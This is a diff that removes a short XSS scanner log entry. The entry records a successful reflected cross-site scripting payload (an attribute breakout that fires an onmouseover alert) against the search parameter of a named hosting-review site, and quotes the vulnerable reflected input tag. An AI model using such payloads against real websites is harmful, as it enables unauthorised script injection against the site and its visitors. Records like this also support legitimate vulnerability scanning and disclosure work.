@@ -1,9 +1,0 @@
-DirectGetParams/.webhostingsearch.com
-
-http://www.webhostingsearch.com//reviews.php?searchString=" onmouseover="alert`1`
-Context = ATTR
-Success = TRUE
-Detection:
-<input type="text" value="" onmouseover="alert`1`" placeholder="Search for a specific web hosting provider..." />
-
------------------------------------------------------------------------------------------------------
